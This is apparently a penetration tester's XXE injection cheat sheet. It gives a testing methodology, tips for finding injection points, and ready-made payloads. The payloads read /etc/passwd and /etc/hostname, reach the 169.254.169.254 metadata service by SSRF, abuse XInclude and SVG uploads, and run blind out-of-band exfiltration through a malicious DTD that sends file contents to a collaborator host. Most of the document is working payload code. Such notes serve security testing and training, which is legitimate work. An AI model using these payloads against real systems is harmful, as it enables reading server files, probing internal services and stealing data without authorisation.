# Resources
- [XXE Playlist - Seven Seas Security](https://www.youtube.com/playlist?list=PL1GDzLoRwyVC_ZvAIbyUD2tv3OqCh8XZB)
- Michael Sommer videos
# Extensions
- Burp Extension - Content Type Converter
# Methodology
- Declare a local entity and test the server response
- Reference the entity and check the server response
- Check and try to confirm that the xml entities are being parsed. Input an non-existent entity and check for a parsing error
- Change the local entity to an external entity
- Check if the vulnerability can be exploited in-bound or out-of-bound
- Is there an entity blacklist? Try parameter entities
# Identify injection point
Look for functionality where a SVG could be uploaded
Look for API requests using XML
If the API expects another format, see if it accepts XML
Even if the application does not accept XML explicitly, try to declare an encoded XML entity and see the server response,
it might reveal that the application is parsing XML
Encoding might be required
```http
%26entity; <= URL encoded
```
# XML External Entities Injection
Payload structure
```html
<!DOCTYPE anything [<!ENTITY name "url"> ]>
```
- Retrieve file from the system
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
- SSRF to internal site
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
- XInclude Attack: Whenever we can't define or modify a DOCTYPE element, use XInclude.
This technology allows you to include the contents of a XML document into another XML document.
```html
<exa xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></exa>
```
- XXE via SVG file upload
```html
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```
# Blind XXE
- Out-of-band interaction
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://burp-collaborator/"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
- Bypass Entity Blacklist - Blind XXE with out-of-band interaction via XML parameter entities
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://burp-collaborator"> %xxe; ]>
```
- Using out-of-band interaction to exfiltrate data
Setup a malicious DTD (.dtd) file declaring xml parameter entities and stack the entities to retrieve the data and then send it out
Payload - Malicious DTD
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'http://burp-collaborator?x=%file;'>">
```
Payload - HTTP Request
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "url-to-dtd"> %xxe;
%stack;
%exfil;]>
```
- Exploiting XXE via Error Messages:
If the previous method fails, modidy it to try to trigger an error by referencing an non-existent file
Payload - Malicious DTD
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'file:///nonexistentfile/%file;'>">
```
Payload - HTTP Request
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "url-to-dtd"> %xxe;
%stack;
%exfil;]>
```
